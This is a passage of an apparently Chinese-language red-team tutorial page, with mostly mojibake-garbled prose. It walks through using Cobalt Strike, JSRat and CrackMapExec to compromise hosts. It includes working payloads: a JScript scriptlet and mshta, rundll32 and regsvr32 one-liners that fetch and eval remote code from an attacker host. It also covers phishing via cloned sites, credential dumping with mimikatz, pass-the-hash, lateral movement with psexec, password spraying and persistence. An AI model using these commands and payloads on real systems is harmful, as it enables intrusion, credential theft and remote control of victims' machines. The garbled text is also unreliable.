<h4 id="è¿æ¥"><a href="#è¿æ¥" class="headerlink" title="è¿æ¥"></a>è¿æ¥</h4><p><img src="./img/212.png" alt="image"></p>
<h4 id="ç›‘å¬å™¨"><a href="#ç›‘å¬å™¨" class="headerlink" title="ç›‘å¬å™¨"></a>ç›‘å¬å™¨</h4><pre><code>åˆ›å»º
Cobalt Strike -&gt; Listenersç‚¹å‡»Add
</code></pre>
<p><img src="./img/213.png" alt="image"></p>
<pre><code>Beaconä¸ºCSå†…éƒ¨ç›‘å¬å™¨ã€‚
Foreignä¸€èˆ¬ä¸MSFç»“åˆä½¿ç”¨ã€‚
ç³»ç»Ÿæ¶æ„çš„æ”¯æŒ
</code></pre>
<p><img src="./img/214.png" alt="image"></p>
<h4 id="æ”»å‡»æ¨¡å—"><a href="#æ”»å‡»æ¨¡å—" class="headerlink" title="æ”»å‡»æ¨¡å—"></a>æ”»å‡»æ¨¡å—</h4><p><img src="./img/215.png" alt="image"><br>|åç§°   |åŠŸèƒ½   |<br>| â€”â€”â€”â€” | â€”â€”â€”â€” |<br>|HTML Application   |åŸºäºpowershellçš„.htaæ ¼å¼çš„HTML Applicationæœ¨é©¬ï¼Œåˆ†ä¸ºå¯æ‰§è¡Œæ–‡ä»¶ã€PowerShellã€VBAä¸‰ç§æ–¹æ³•   |<br>|MS Office Macro  |officeå®ç—…æ¯’æ–‡ä»¶   |<br>|Payload Generator   |åŸºäºCã€C#ã€COM Scriptletã€Javaã€Perlã€PowerShellã€Pythonã€Rubyã€VBAç­‰è¯­è¨€çš„payload   |<br>|USB/CD AutoPlay   |åˆ©ç”¨USB/CDè‡ªåŠ¨æ’­æ”¾è¿è¡Œçš„æœ¨é©¬   |<br>|Windows Dropper   |æ†ç»‘å™¨   |<br>|Windows Executable   |ç”Ÿæˆ32ä½æˆ–64ä½çš„exeå’ŒåŸºäºæœåŠ¡çš„å¯æ‰§è¡Œæ–‡ä»¶ã€DLLç­‰åé—¨   |<br>|Windows Executable(S)   |ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œæ”¯æŒpowershellè„šæœ¬ï¼Œæä¾›ä»£ç†åŠŸèƒ½   |</p>
<pre><code>Web Drive-byåŸºäºWEBçš„æ”»å‡»æ¨¡å—
</code></pre>
<table>
<thead>
<tr>
<th>åç§°</th>
<th>åŠŸèƒ½</th>
</tr>
</thead>
<tbody><tr>
<td>Manage</td>
<td>ç®¡ç†å¼€å¯çš„æ¨¡å—</td>
</tr>
<tr>
<td>Clone Site</td>
<td>å…‹éš†ç½‘ç«™</td>
</tr>
<tr>
<td>Host File</td>
<td>æä¾›æ–‡ä»¶ä¸‹è½½</td>
</tr>
<tr>
<td>Scripted Web Delivery</td>
<td>åŸºäºWebçš„æ”»å‡»Payload</td>
</tr>
<tr>
<td>Signed Applet Attack</td>
<td>è¿è¡Œjavaè‡ªç­¾åçš„æ”»å‡»æ¨¡å—</td>
</tr>
<tr>
<td>Smart Applet Attack</td>
<td>è‡ªåŠ¨æ£€æµ‹Javaç‰ˆæœ¬å¹¶åˆ©ç”¨å·²çŸ¥çš„exploitsæ”»å‡»</td>
</tr>
<tr>
<td>System Profiler</td>
<td>ä¿¡æ¯æ¢æµ‹æ¨¡å—</td>
</tr>
</tbody></table>
<h4 id="è§†å›¾æ¨¡å—"><a href="#è§†å›¾æ¨¡å—" class="headerlink" title="è§†å›¾æ¨¡å—"></a>è§†å›¾æ¨¡å—</h4><table>
<thead>
<tr>
<th>Applications</th>
<th>æ˜¾ç¤ºé¶æœºåº”ç”¨ä¿¡æ¯</th>
</tr>
</thead>
<tbody><tr>
<td>Credentials</td>
<td>æ˜¾ç¤ºå¯†ç (hashdumpå’Œmimikatzè·å–çš„)</td>
</tr>
<tr>
<td>Downloads</td>
<td>ä¸‹è½½æ–‡ä»¶</td>
</tr>
<tr>
<td>Event Log</td>
<td>äº‹ä»¶æ—¥å¿—</td>
</tr>
<tr>
<td>Keystrokes</td>
<td>é”®ç›˜è®°å½•</td>
</tr>
<tr>
<td>Proxy Pivots</td>
<td>ä»£ç†ä¿¡æ¯</td>
</tr>
<tr>
<td>Screenshots</td>
<td>å±å¹•æˆªå›¾</td>
</tr>
<tr>
<td>Script Console</td>
<td>åŠ è½½è„šæœ¬</td>
</tr>
<tr>
<td>Targets</td>
<td>æŸ¥çœ‹ç›®æ ‡</td>
</tr>
<tr>
<td>Web Log</td>
<td>æŸ¥çœ‹webæ—¥å¿—</td>
</tr>
</tbody></table>
<pre><code>åˆ›å»ºpowershellè„šæœ¬
</code></pre>
<p><img src="./img/216.png" alt="image"><br><img src="./img/217.png" alt="image"></p>
<pre><code>å¤åˆ¶è„šæœ¬åˆ°ç›®æ ‡æœºæ‰§è¡Œå³å¯ä¸Šçº¿.
</code></pre>
<p><img src="./img/218.png" alt="image"></p>
<h4 id="äº¤äº’-1"><a href="#äº¤äº’-1" class="headerlink" title="äº¤äº’"></a>äº¤äº’</h4><pre><code>å³é”®ç›®æ ‡æœºInteractè¿›å…¥äº¤äº’æ¨¡å¼
Access    
Dump hashes    è·å–å¯†ç 
Elevate    ææƒ
Golden Ticket    é»„é‡‘ç¥¨æ®æ³¨å…¥ä¼šè¯
Make token    åˆ¶ä½œä»¤ç‰Œ
Run Mimikatz    è¿è¡Œmimikatz
Spawn As    ä»¥é¶æœºå…¶ä»–ç”¨æˆ·æƒé™ç”Ÿæˆä¼šè¯
Explore    
Browser Pivot    åŠ«æŒæµè§ˆå™¨
Desktop(VNC)    è¿œç¨‹VNC
File Browser    æ–‡ä»¶ç®¡ç†
Net View    æ‰§è¡Œå‘½ä»¤net view
Port scan    ç«¯å£æ‰«æ
Process list    è¿›ç¨‹åˆ—è¡¨
Screenshot    æˆªå›¾
Pivoting        
SOCKS Server    ä»£ç†
Listener    å·²è·æƒé™çš„æœºå™¨å½“ä½œç›‘å¬å™¨(åå‘ç«¯å£è½¬å‘)
Deploy VPN    éƒ¨ç½²VPN
Spawn    
æ´¾ç”Ÿä¼šè¯ï¼šè”åŠ¨MSFæˆ–Armitage    
å³é”®æ‰§è¡Œmimikatzå³å¯è·å–hashåŠæ˜æ–‡å¯†ç 
</code></pre>
<p><img src="./img/219.png" alt="image"></p>
<pre><code>è§†å›¾-&gt;å‡­è¯ä¿¡æ¯åˆ—å‡ºå¯†ç ï¼Œç±»ä¼¼empireçš„credså‘½ä»¤
</code></pre>
<p><img src="./img/220.png" alt="image"></p>
<h4 id="Beacon"><a href="#Beacon" class="headerlink" title="Beacon"></a>Beacon</h4><pre><code>argue                     è¿›ç¨‹å‚æ•°æ¬ºéª—
blockdlls                  é˜»æ­¢å­è¿›ç¨‹åŠ è½½éMicrosoft DLL
browserpivot              æ³¨å…¥å—å®³è€…æµè§ˆå™¨è¿›ç¨‹
bypassuac                ç»•è¿‡UACæå‡æƒé™
cancel                    å–æ¶ˆæ­£åœ¨è¿›è¡Œçš„ä¸‹è½½
cd                        åˆ‡æ¢ç›®å½•
checkin                   å¼ºåˆ¶è®©è¢«æ§ç«¯å›è¿ä¸€æ¬¡
clear                     æ¸…é™¤beaconå†…éƒ¨çš„ä»»åŠ¡é˜Ÿåˆ—
connect                   Connect to a Beacon peer over TCP
covertvpn                 éƒ¨ç½²Covert VPNå®¢æˆ·ç«¯
cp                        å¤åˆ¶æ–‡ä»¶
dcsync                    ä»DCä¸­æå–å¯†ç å“ˆå¸Œ
desktop                   è¿œç¨‹æ¡Œé¢(VNC)
dllinject                   åå°„DLLæ³¨å…¥è¿›ç¨‹
dllload                    ä½¿ç”¨LoadLibraryå°†DLLåŠ è½½åˆ°è¿›ç¨‹ä¸­
download                 ä¸‹è½½æ–‡ä»¶
downloads                åˆ—å‡ºæ­£åœ¨è¿›è¡Œçš„æ–‡ä»¶ä¸‹è½½
drives                     åˆ—å‡ºç›®æ ‡ç›˜ç¬¦
elevate                    ä½¿ç”¨exp
execute                   åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(æ— è¾“å‡º)
execute-assembly         åœ¨ç›®æ ‡ä¸Šå†…å­˜ä¸­æ‰§è¡Œæœ¬åœ°.NETç¨‹åº
exit                       ç»ˆæ­¢beaconä¼šè¯
getprivs                   Enable system privileges on current token
getsystem                 å°è¯•è·å–SYSTEMæƒé™
getuid                     è·å–ç”¨æˆ·ID
hashdump                  è½¬å‚¨å¯†ç å“ˆå¸Œå€¼
help                       å¸®åŠ©
inject                      åœ¨æ³¨å…¥è¿›ç¨‹ç”Ÿæˆä¼šè¯
jobkill                     ç»“æŸä¸€ä¸ªåå°ä»»åŠ¡
jobs                       åˆ—å‡ºåå°ä»»åŠ¡
kerberos_ccache_use       ä»ccacheæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯
kerberos_ticket_purge     æ¸…é™¤å½“å‰ä¼šè¯çš„ç¥¨æ®
kerberos_ticket_use       Apply ä»ticketæ–‡ä»¶ä¸­å¯¼å…¥ç¥¨æ®åº”ç”¨äºæ­¤ä¼šè¯
keylogger                 é”®ç›˜è®°å½•
kill                      ç»“æŸè¿›ç¨‹
link                      Connect to a Beacon peer over a named pipe
logonpasswords            ä½¿ç”¨mimikatzè½¬å‚¨å‡­æ®å’Œå“ˆå¸Œå€¼
ls                        åˆ—å‡ºæ–‡ä»¶
make_token                åˆ›å»ºä»¤ç‰Œä»¥ä¼ é€’å‡­æ®
mimikatz                  è¿è¡Œmimikatz
mkdir                     åˆ›å»ºä¸€ä¸ªç›®å½•
mode dns                  ä½¿ç”¨DNS Aä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon)
mode dns-txt              ä½¿ç”¨DNS TXTä½œä¸ºé€šä¿¡é€šé“(ä»…é™D beacon)
mode dns6                 ä½¿ç”¨DNS AAAAä½œä¸ºé€šä¿¡é€šé“(ä»…é™DNS beacon)
mode http                 ä½¿ç”¨HTTPä½œä¸ºé€šä¿¡é€šé“
mv                        ç§»åŠ¨æ–‡ä»¶
net                       netå‘½ä»¤
note                      å¤‡æ³¨       
portscan                  è¿›è¡Œç«¯å£æ‰«æ
powerpick                 é€šè¿‡Unmanaged PowerShellæ‰§è¡Œå‘½ä»¤
powershell                é€šè¿‡powershell.exeæ‰§è¡Œå‘½ä»¤
powershell-import         å¯¼å…¥powershellè„šæœ¬
ppid                      Set parent PID for spawned post-ex jobs
ps                        æ˜¾ç¤ºè¿›ç¨‹åˆ—è¡¨
psexec                    Use a service to spawn a session on a host
psexec_psh                Use PowerShell to spawn a session on a host
psinject                  åœ¨ç‰¹å®šè¿›ç¨‹ä¸­æ‰§è¡ŒPowerShellå‘½ä»¤
pth                       ä½¿ç”¨Mimikatzè¿›è¡Œä¼ é€’å“ˆå¸Œ
pwd                       å½“å‰ç›®å½•ä½ç½®
reg                       Query the registry
rev2self                  æ¢å¤åŸå§‹ä»¤ç‰Œ
rm                        åˆ é™¤æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹
rportfwd                  ç«¯å£è½¬å‘
run                       åœ¨ç›®æ ‡ä¸Šæ‰§è¡Œç¨‹åº(è¿”å›è¾“å‡º)
runas                     ä»¥å…¶ä»–ç”¨æˆ·æƒé™æ‰§è¡Œç¨‹åº
runasadmin                åœ¨é«˜æƒé™ä¸‹æ‰§è¡Œç¨‹åº
runu                      Execute a program under another PID
screenshot                å±å¹•æˆªå›¾
setenv                    è®¾ç½®ç¯å¢ƒå˜é‡
shell                     æ‰§è¡Œcmdå‘½ä»¤
shinject                  å°†shellcodeæ³¨å…¥è¿›ç¨‹
shspawn                   å¯åŠ¨ä¸€ä¸ªè¿›ç¨‹å¹¶å°†shellcodeæ³¨å…¥å…¶ä¸­
sleep                     è®¾ç½®ç¡çœ å»¶è¿Ÿæ—¶é—´
socks                     å¯åŠ¨SOCKS4ä»£ç†
socks stop                åœæ­¢SOCKS4
spawn                     Spawn a session 
spawnas                   Spawn a session as another user
spawnto                   Set executable to spawn processes into
spawnu                    Spawn a session under another PID
ssh                       ä½¿ç”¨sshè¿æ¥è¿œç¨‹ä¸»æœº
ssh-key                   ä½¿ç”¨å¯†é’¥è¿æ¥è¿œç¨‹ä¸»æœº
steal_token               ä»è¿›ç¨‹ä¸­çªƒå–ä»¤ç‰Œ
timestomp                 å°†ä¸€ä¸ªæ–‡ä»¶çš„æ—¶é—´æˆ³åº”ç”¨åˆ°å¦ä¸€ä¸ªæ–‡ä»¶
unlink                    Disconnect from parent Beacon
upload                    ä¸Šä¼ æ–‡ä»¶
wdigest                   ä½¿ç”¨mimikatzè½¬å‚¨æ˜æ–‡å‡­æ®
winrm                     ä½¿ç”¨WinRMæ¨ªå‘æ¸—é€
wmi                       ä½¿ç”¨WMIæ¨ªå‘æ¸—é€
æ‰§è¡Œå‘½ä»¤ï¼Œåœ¨beaconæ¨¡å¼ä¸‹é”®å…¥shell+å‘½ä»¤
</code></pre>
<p><img src="./img/221.png" alt="image"></p>
<pre><code>&gt;sleep 0 äº¤äº’æ¨¡å¼ï¼Œç«‹åˆ»æ‰§è¡Œå‘½ä»¤
æ³¨å…¥DLLåˆ°æŸä¸ªè¿›ç¨‹
&gt;dllload [pid] [c:\path\to\file.dll] DLLéœ€åœ¨ç›®æ ‡ä¸Š
&gt;kerberos_ticket_purge æ¸…é™¤ç¥¨æ®
&gt;kerberos_ccache_use    [/path/to/file.ccache]  ä»ccacheæ–‡ä»¶å¯¼å…¥ç¥¨æ®
&gt;kerberos_ticket_use [/path/to/file.ccache] ä»ticketæ–‡ä»¶å¯¼å…¥ç¥¨æ®
&gt;kill pid ç»“æŸè¿›ç¨‹
&gt;timestomp [fileA]    [fileB] ä¿®æ”¹æ–‡ä»¶æ—¶é—´æˆ³
&gt;getuid     è·å–å½“å‰ç”¨æˆ·
&gt;steal_token [pid] çªƒå–è¿›ç¨‹ID
&gt;rev2self æ¢å¤åŸå§‹ä»¤ç‰Œ
&gt;powershell-import    [/path/to/local/script.ps1] å¯¼å…¥PSæ¨¡å— 
&gt;shinject [pid] &lt;x86|x64&gt; [/path/to/my.bin] å‘è¿›ç¨‹æ³¨å…¥shellcode
&gt;socks    portåœ¨æŒ‡å®šç«¯å£å¼€å¯ä»£ç†
&gt;socks stopåœæ­¢ä»£ç†
&gt;rportfwd [bind port]    [forward host]    [forward port]å¼€å¯ç«¯å£è½¬å‘
</code></pre>
<h4 id="å…‹éš†ç½‘ç«™"><a href="#å…‹éš†ç½‘ç«™" class="headerlink" title="å…‹éš†ç½‘ç«™"></a>å…‹éš†ç½‘ç«™</h4><pre><code>Attacks -&gt; Web Drive-by -&gt; System Profiler
Redirect urlè®¾ç½®ä¸ºç›®æ ‡ç«™ï¼Œç™»å½•æˆåŠŸä¼šæŒ‘æˆ˜åˆ°çœŸå®ç½‘ç«™
é’“é±¼æ”»å‡»-&gt;å…‹éš†ç½‘ç«™
å…‹éš†åœ°å€å†™å…¥è¦å…‹éš†çš„ç½‘ç«™
Attacké€‰æ‹©åˆšåˆšæ”¶é›†ä¿¡æ¯çš„ç½‘ç«™
Webæ—¥å¿—ç•Œé¢å¯è®°å½•é”®ç›˜
</code></pre>
<p><img src="./img/222.png" alt="image"></p>
<pre><code>æ”»å‡»-&gt;é’“é±¼æ”»å‡»ç®¡ç†-&gt;webæœåŠ¡ç®¡ç†ä¸­ï¼Œå¯killæ‰åˆšåˆšçš„ä»»åŠ¡
</code></pre>
<p><img src="./img/223.png" alt="image"></p>
<h4 id="officeå®"><a href="#officeå®" class="headerlink" title="officeå®"></a>officeå®</h4><p><img src="./img/224.png" alt="image"><br><img src="./img/225.png" alt="image"><br><img src="./img/226.png" alt="image"></p>
<h4 id="é’“é±¼é‚®ä»¶-1"><a href="#é’“é±¼é‚®ä»¶-1" class="headerlink" title="é’“é±¼é‚®ä»¶"></a>é’“é±¼é‚®ä»¶</h4><pre><code>æ–°å…‹éš†ä¸€ä¸ªç½‘ç«™
</code></pre>
<p><img src="./img/227.png" alt="image"></p>
<pre><code>Embed URLé€‰æ‹©å…‹éš†å¥½çš„ç½‘ç«™
</code></pre>
<p><img src="./img/228.png" alt="image"><br><img src="./img/229.png" alt="image"><br><img src="./img/230.png" alt="image"></p>
<pre><code>é‡Œé¢çš„è¶…é“¾æ¥å·²ç»è¢«Embed URLå…‹éš†å¥½çš„URLæ›¿æ¢æ‰äº†
</code></pre>
<p><img src="./img/231.png" alt="image"><br><img src="./img/232.png" alt="image"></p>
<pre><code>è‹¥æ˜¯è¦åŠ è½½é™„ä»¶ï¼Œéœ€æ³¨æ„é™„ä»¶çš„å…æ€
</code></pre>
<h4 id="åŠ è½½è„šæœ¬"><a href="#åŠ è½½è„šæœ¬" class="headerlink" title="åŠ è½½è„šæœ¬"></a>åŠ è½½è„šæœ¬</h4><pre><code>https://github.com/rsmudge/ElevateKit ææƒè„šæœ¬
&gt;git clone https://github.com/rsmudge/ElevateKit.git
&gt;git clone https://github.com/TheKingOfDuck/myScripts.git
Cobalt Strike -&gt; Scripts é€‰æ‹©elevate.cnaåŠ è½½
ææƒçš„EXPåˆ—è¡¨å°±ä¼šå¢åŠ å·²ç»åŠ å…¥çš„æ¨¡å—
</code></pre>
<h4 id="æµè§ˆå™¨åŠ«æŒ"><a href="#æµè§ˆå™¨åŠ«æŒ" class="headerlink" title="æµè§ˆå™¨åŠ«æŒ"></a>æµè§ˆå™¨åŠ«æŒ</h4><pre><code>beacon è®¾ä¸ºäº¤äº’æ¨¡å¼
beacon&gt; sleep 0
[Beacon] â†’ Explore â†’ Browser Pivot
é€‰æ‹©æ‰“å¯¹å‹¾çš„æ³¨å…¥ï¼Œä¼šè¿”å›ä¸€ä¸ªproxyï¼ŒæœåŠ¡å™¨IP+ç«¯å£
&gt;chromium --no-sandbox --ignore-certificate-errors --proxy-server=æœåŠ¡å™¨IP:ç«¯å£
è®¿é—®ç½‘å€
</code></pre>
<h4 id="æƒé™ç»´æŒ"><a href="#æƒé™ç»´æŒ" class="headerlink" title="æƒé™ç»´æŒ"></a>æƒé™ç»´æŒ</h4><pre><code>https://github.com/DeEpinGh0st/Erebus
åŠ è½½ cna è„šæœ¬
Cobalt Strike â†’ Script Manager â†’ Load â†’ Erebus ä¸­çš„ Main.cna
ç”Ÿæˆ Payload
Attacks â†’ Packagesâ†’ Windows Executable(S)
Erebus â†’ Persistenceé€‰æ‹©ç»´æŒæ–¹æ³•
</code></pre>
<h4 id="æ¨ªå‘-1"><a href="#æ¨ªå‘-1" class="headerlink" title="æ¨ªå‘"></a>æ¨ªå‘</h4><pre><code>æ‰«æå­˜æ´»ä¸»æœº
&gt;portscan ip/ç½‘æ®µ portsç«¯å£ æ‰«æåè®®(arpã€icmpã€none) çº¿ç¨‹
&gt;portscan 192.168.1.0/24 445 arp 100
æˆ–å³é”®ç›®æ ‡&gt;æ‰«æ
ç‚¹å‡»å·¥å…·æ çš„Viewâ€“&gt;Targetsï¼ŒæŸ¥çœ‹ç«¯å£æ¢æµ‹åçš„å­˜æ´»ä¸»æœºã€‚ï¼ˆTargetså¯è‡ªè¡Œæ·»åŠ ï¼‰
Login-&gt;psexecè¿›è¡Œhashä¼ é€’ç™»å½•
</code></pre>
<h4 id="éš”ç¦»ç½‘ç»œ"><a href="#éš”ç¦»ç½‘ç»œ" class="headerlink" title="éš”ç¦»ç½‘ç»œ"></a>éš”ç¦»ç½‘ç»œ</h4><h5 id="æƒé™æœºä¸­è½¬"><a href="#æƒé™æœºä¸­è½¬" class="headerlink" title="æƒé™æœºä¸­è½¬"></a>æƒé™æœºä¸­è½¬</h5><pre><code>Pivoting -&gt;Listeneræ–°å»ºä¸€æ¡å·²æœ‰æƒé™æœºå™¨çš„ç›‘å¬å™¨
</code></pre>
<p><img src="./img/233.png" alt="image"><br><img src="./img/234.png" alt="image"><br><img src="./img/235.png" alt="image"></p>
<pre><code>é€‰æ‹© Attacks-&gt;Packages-&gt;Windows Executable(Stageless) 
</code></pre>
<p><img src="./img/236.png" alt="image"></p>
<pre><code>ä¸Šä¼ ç”Ÿæˆçš„payloadåˆ°å·²ä¸Šçº¿çš„ç›®æ ‡æœºä¸­ï¼Œä¸Šä¼ PsExec.exe
beacon&gt;shell C:\psexec.exe -accepteula \\10.1.1.105 -u administrator -p xxx -d -c C:\beacon.exe
</code></pre>
<p><img src="./img/237.png" alt="image"></p>
<h5 id="SMB-beacon"><a href="#SMB-beacon" class="headerlink" title="SMB_beacon"></a>SMB_beacon</h5><pre><code>æ–°å»ºç›‘å¬å™¨(bind)windows/beacon_smb/bind_pipe
æ‰§è¡Œ
&gt;psexec æœºå™¨å ADMIN$/c$ bind
</code></pre>
<h5 id="SSH-login"><a href="#SSH-login" class="headerlink" title="SSH login"></a>SSH login</h5><pre><code>&gt;ssh 10.1.1.98:22 root admin
</code></pre>
<p><img src="./img/238.png" alt="image"></p>
<h4 id="ä»£ç†"><a href="#ä»£ç†" class="headerlink" title="ä»£ç†"></a>ä»£ç†</h4><pre><code>&gt;socks 690
è§†å›¾-&gt;ä»£ç†ä¿¡æ¯-tunnel ç›´æ¥å¤åˆ¶ï¼Œç²˜è´´åˆ°MSFä¸­
</code></pre>
<h4 id="éƒ¨ç½²VPN"><a href="#éƒ¨ç½²VPN" class="headerlink" title="éƒ¨ç½²VPN"></a>éƒ¨ç½²VPN</h4><p><img src="./img/239.png" alt="image"></p>
<pre><code>é€‰æ‹©å†…ç½‘ç½‘å¡
</code></pre>
<p><img src="./img/240.png" alt="image"><br><img src="./img/241.png" alt="image"><br><img src="./img/242.png" alt="image"></p>
<pre><code>æ·»åŠ 
</code></pre>
<p><img src="./img/243.png" alt="image"><br><img src="./img/244.png" alt="image"><br><img src="./img/245.png" alt="image"></p>
<pre><code>åˆ é™¤
</code></pre>
<p><img src="./img/246.png" alt="image"></p>
<h4 id="Cobalt-strikeæ´¾ç”Ÿ-Empireå’ŒMSF"><a href="#Cobalt-strikeæ´¾ç”Ÿ-Empireå’ŒMSF" class="headerlink" title="Cobalt strikeæ´¾ç”Ÿ Empireå’ŒMSF"></a>Cobalt strikeæ´¾ç”Ÿ Empireå’ŒMSF</h4><h5 id="æ´¾ç”ŸEmpire-1"><a href="#æ´¾ç”ŸEmpire-1" class="headerlink" title="æ´¾ç”ŸEmpire"></a>æ´¾ç”ŸEmpire</h5><pre><code>åˆ›å»ºä¸€ä¸ªListener
åˆ›å»ºä¸€ä¸ªstager
&gt;usestager windows/shellcode æ‰§è¡Œï¼Œä¼šç”Ÿæˆ/tmp/launcher.bin
CS ä½¿ç”¨PSå‘½ä»¤æŸ¥æ‰¾è¿›ç¨‹ï¼Œè¿›è¡Œè¿›ç¨‹æ³¨å…¥(&gt;shinject è¿›ç¨‹id x64)ï¼Œé€‰æ‹©launcher.binå³å¯
</code></pre>
<h5 id="æ´¾ç”ŸMSF-1"><a href="#æ´¾ç”ŸMSF-1" class="headerlink" title="æ´¾ç”ŸMSF"></a>æ´¾ç”ŸMSF</h5><pre><code>ä½¿ç”¨CSçš„å¤–éƒ¨ç›‘å¬å™¨
windows/foreign/reverse_dns_txt
windows/foreign/reverse_http
windows/foreign/reverse_https
windows/foreign/reverse_tcp
msfå¼€å¯ç›‘å¬
cobalt strikeä¼šè¯ä¸»æœºä¸Šç‚¹å‡»spwanï¼Œåˆ›å»ºå¤–éƒ¨ç›‘å¬å™¨ï¼Œé€‰æ‹©windows/foreign/reverse_tcpæŒ‡å®šMSFç›‘å¬çš„IPå’Œç«¯å£å³å¯
</code></pre>
<h3 id="JSRat-1"><a href="#JSRat-1" class="headerlink" title="JSRat"></a>JSRat</h3><pre><code>https://github.com/Hood3dRob1n/JSRat-Py
https://github.com/Ridter/MyJSRat
å¯åŠ¨
&gt;python JSRat.py -i 192.168.0.107 -p 1234
MyJSRatå¯ä»¥-cå‚æ•°æŒ‡å®šæ‰§è¡Œçš„å‘½ä»¤
</code></pre>
<p><img src="./img/247.png" alt="image"></p>
<pre><code>/connectæ˜¯å›è¿åœ°å€ï¼Œ/wtfæ˜¯æ‰§è¡Œä»£ç 
</code></pre>
<p><img src="./img/248.png" alt="image"></p>
<pre><code>ç›´æ¥åœ¨é¶æœºæ‰§è¡Œ
</code></pre>
<p><img src="./img/249.png" alt="image"></p>
<pre><code>æˆ–
&gt;regsvr32.exe /u /n /s /i:http://192.168.0.107:1234/file.sct scrobj.dll
JSRatæ˜¾ç¤ºä¸Šçº¿
</code></pre>
<p><img src="./img/250.png" alt="image"><br><img src="./img/251.png" alt="image"></p>
<pre><code>Wscæ–¹å¼
</code></pre>
<pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0"?></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>package</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>component</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>testCalc<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">language</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>JScript<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token cdata">&lt;![CDATA[
        rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try&#123;v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);&#125;catch(e)&#123;&#125;h.Open(\"GET\",\"http://192.168.0.107:1234/connect\",false);try&#123;h.Send();B=h.ResponseText;eval(B);&#125;catch(e)&#123;new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);&#125;";
        new ActiveXObject("WScript.Shell").Run(rat,0,true);
]]></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>component</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>package</span><span class="token punctuation">></span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>&gt;rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();GetObject(&quot;script:http://192.168.0.107/jsrat.wsc&quot;)
Mshtaæ–¹å¼
&gt;mshta javascript:&quot;\..\mshtml,RunHTMLApplication &quot;;document.write();h=new%20ActiveXObject(&quot;WinHttp.WinHttpRequest.5.1&quot;);h.Open(&quot;GET&quot;,&quot;http://192.168.0.107:1234/connect&quot;,false);try&#123;h.Send();b=h.ResponseText;eval(b);&#125;catch(e)&#123;new%20ActiveXObject(&quot;WScript.Shell&quot;).Run(&quot;cmd /c taskkill /f /im mshta.exe&quot;,0,true);&#125;
</code></pre>
<h3 id="CrackMapExec"><a href="#CrackMapExec" class="headerlink" title="CrackMapExec"></a>CrackMapExec</h3><h4 id="ä¿¡æ¯æ”¶é›†-1"><a href="#ä¿¡æ¯æ”¶é›†-1" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h4><pre><code>è¿”å›æ´»åŠ¨ä¸»æœº
&gt;crackmapexec smb 192.168.0.0/24
</code></pre>
<p><img src="./img/252.png" alt="image"></p>
<h4 id="çˆ†ç ´-1"><a href="#çˆ†ç ´-1" class="headerlink" title="çˆ†ç ´"></a>çˆ†ç ´</h4><pre><code>æ”¯æŒåè®®ssh,smb,winrm,mssql,http
çˆ†ç ´smbåè®®ï¼Œä¸¤å°æœºå™¨ï¼Œä¸€ä¸ªç”¨æˆ·åå¤šä¸ªå¯†ç 
&gt;crackmapexec smb 192.168.0.98 192.168.0.55 -u username1 -p password1 password2
&gt;crackmapexec smb 192.168.0.0/24 -d zone.com -u y -p &#39;password&#39; --shares
</code></pre>
<p><img src="./img/253.png" alt="image"></p>
<pre><code>å¯†ç å–·å°„
&gt;crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u username1 username2 -p password1
æŒ‡å®šå­—å…¸
&gt;crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u /tmp/user.txt -p /tmp/pass.txt
Hashçˆ†ç ´
&gt;crackmapexec &lt;protocol&gt; &lt;target(s)&gt; -u /tmp/user.txt -H /tmp/ntlm.txt
</code></pre>
<h4 id="å¯ç”¨æ¨¡å—"><a href="#å¯ç”¨æ¨¡å—" class="headerlink" title="å¯ç”¨æ¨¡å—"></a>å¯ç”¨æ¨¡å—</h4><pre><code>æ—¥å¿—çš„ä¿å­˜ä½ç½®
~/.cme/logs
æŸ¥çœ‹åè®®å¯ç”¨åç»­æ¨¡å—
&gt;crackmapexec smb -L
</code></pre>
<p><img src="./img/254.png" alt="image"></p>
<pre><code>å¸¸ç”¨çš„æ¨¡å—
Get-ComputerDetailsè·å–è®¡ç®—æœºä¿¡æ¯
Bloodhound æ‰§è¡Œä¸€ä¸ªBloodHoundè„šæœ¬è·å–ä¿¡æ¯
empire_exec ä¸empireäº¤äº’
enum_avproducts åˆ—ä¸¾AVäº§å“
enum_chrome è·å–ç›®æ ‡chromeä¸­ä¿å­˜çš„å¯†ç 
get_keystrokes é”®ç›˜è®°å½•
get_netdomaincontroller åˆ—å‡ºæ‰€æœ‰åŸŸæ§åˆ¶å™¨
